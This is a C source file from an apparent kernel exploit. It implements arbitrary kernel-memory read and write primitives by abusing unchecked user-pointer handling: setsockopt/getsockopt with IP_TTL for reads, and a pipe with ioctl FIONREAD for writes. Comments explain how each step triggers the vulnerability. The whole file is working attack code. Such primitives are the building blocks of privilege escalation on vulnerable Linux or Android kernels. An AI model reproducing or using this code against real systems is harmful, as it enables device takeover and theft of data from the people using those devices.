#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include "log.h"


// Read a 4-byte value from a specified arbitrary source address
int read_value_at_address(unsigned long int address, unsigned long int *value) {
  int sock;
  int ret;
  int i;
  unsigned long int addr = address; // Our kernel space pointer
  unsigned char *pval = (unsigned char *)value;
  socklen_t optlen = 1;

  *value = 0;
  errno = 0;

  // Create a socket. We need it just to trigger the vuln. We don't need use it.
  sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (sock < 0) 
    return -1;

  // Get the value byte by byte
  for (i = 0; i < sizeof(*value); i++, addr++, pval++) {
    errno = 0;
    
    // Trigger the vuln:
    // We set the TTL for the socket. The value is written in the socket struct using the vulnerable
    // get_user() func. For this reason we can set an arbitrary address as the source containing the
    // TTL value to be set. With the IP_TTL option only the rightmost byte is considered. For this reason
    // we need to trigger the vuln 4 times.

    ret = setsockopt(sock, SOL_IP, IP_TTL, (void *)addr, 1);
    if (ret != 0) {
      if (errno != EINVAL) {
	close(sock);
	*value = 0;
	return -1;
      }
    }
    errno = 0;

    // At this point the TTL is set as the value pointed by out arbitrary address (so a pointer in the
    // kernel space :-) ). We can just ask for it to retrieve an arbitrary kernel space value.

    ret = getsockopt(sock, SOL_IP, IP_TTL, pval, &optlen);
    if (ret != 0) {
      close(sock);
      *value = 0;
      return -1;
    }
  }
  
  close(sock);
  
  return 0;
}


// Write a 4-byte value at an arbitrary address (i.e: a kernel space address :) )
bool write_value_at_address(unsigned long address, int value) {
  char data[4];
  int pfd[2];
  int i;

  *(int *)&data = value;

  if (pipe(pfd) == -1) 
    return false;


  for (i = 0; i < sizeof (data); i++) {
    sleep(0.3);

    char buf[256];

    buf[0] = 0;

    // Here we trigger the vulnerable put_user() function to write in the kernel space
    // Write n bytes in the writing side of the pipe where n is the 1-byte value we want to write
    if (data[i]) {
      if (write(pfd[1], buf, data[i]) != data[i]) {
        LOGD("error in write().\n");
        return false;
      }
      LOGD("Write OK\n");
    }

    // Now ask to the kernel to write in a location how many byte are pending for reading. 
    // Here we trigger the vuln because no check is performed on the destination address.
    if (ioctl(pfd[0], FIONREAD, (void *)(address + i)) == -1) {
      perror("ioctl");
      return false;
    }
    LOGD("ioctl OK\n");

    // Empty the pipe and go on.
    if (data[i]) {
      if (read(pfd[0], buf, sizeof buf) != data[i]) {
        LOGD("error in read().\n");
	return false;
      }
      LOGD("read OK\n");
    }
  }

  close(pfd[0]);
  close(pfd[1]);

  // Check if we were able to write the value
  return i == sizeof(data);
}
